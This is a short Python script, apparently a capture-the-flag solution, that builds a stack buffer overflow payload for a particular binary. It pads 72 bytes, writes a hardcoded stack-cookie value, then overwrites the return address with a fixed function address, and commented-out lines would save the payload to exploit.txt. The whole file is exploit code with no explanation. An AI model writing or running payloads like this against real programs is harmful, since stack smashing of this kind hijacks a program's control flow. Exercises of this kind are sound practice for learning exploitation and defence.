import struct 

sys_add = 0x4007be
#sys_add = 0x7ffff7a56800
#exit0 = 0x00000000004006c5
sys=0x40062d
cookie = 0x1337133713371337
payload = 'A'*72 + struct.pack("<Q",cookie) + 'A'*8 + struct.pack("<Q",sys) 
#f = open("exploit.txt", 'wb+')
#f.write(payload)
#f.close() 
